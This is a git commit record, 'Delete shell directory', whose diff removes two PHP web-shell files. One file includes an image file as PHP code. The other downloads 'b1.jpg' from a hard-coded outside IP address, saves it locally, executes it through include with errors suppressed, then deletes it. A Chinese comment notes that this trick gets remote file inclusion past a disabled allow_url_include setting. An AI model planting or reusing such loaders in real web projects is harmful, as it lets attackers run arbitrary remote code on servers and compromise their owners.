ff1f5c688c948c996db1829aa7fe3d17bd077a16
FJ <xxaq22@163.com>
2021-03-26 13:38:08 +0800

    Delete shell directory

--- shell/w1.php
+++
@@ -1,1 +0,0 @@
-<?php include "./b1.jpg"?>
--- shell/w2.php
+++
@@ -1,6 +0,0 @@
-<?php 
-@file_put_contents('_',@file_get_contents('http://139.199.220.37/b1.jpg'));
-@include('_');
-@delete('_');
-?>
-也就是说，php.ini没开启 allow_url_include = off  也可以远程文件包含
